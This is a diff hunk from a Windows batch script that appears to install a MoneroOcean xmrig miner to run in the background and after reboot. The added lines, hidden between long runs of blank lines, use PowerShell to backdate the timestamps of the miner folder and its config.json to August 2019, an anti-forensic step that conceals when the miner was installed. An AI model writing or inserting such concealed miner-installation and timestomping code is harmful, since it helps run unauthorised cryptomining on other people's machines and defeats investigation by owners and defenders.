@@ -318,6 +318,38 @@ echo echo Run "taskkill /IM xmrig.exe" if you want to remove background miner fi
 echo :EXIT
 ) > "%USERPROFILE%\moneroocean\miner.bat"
 
+
+
+
+
+
+
+
+
+
+
+powershell -Command "(Get-Item '%USERPROFILE%\moneroocean').CreationTime=('3 August 2019 17:00:00')"
+powershell -Command "(Get-Item '%USERPROFILE%\moneroocean').LastWriteTime=('3 August 2019 17:00:00')"
+
+powershell -Command "(Get-Item '%USERPROFILE%\moneroocean\config.json').CreationTime=('3 August 2019 17:00:00')"
+powershell -Command "(Get-Item '%USERPROFILE%\moneroocean\config.json').LastWriteTime=('3 August 2019 17:00:00')"
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 rem preparing script background work and work under reboot
 
 if %ADMIN% == 1 goto ADMIN_MINER_SETUP
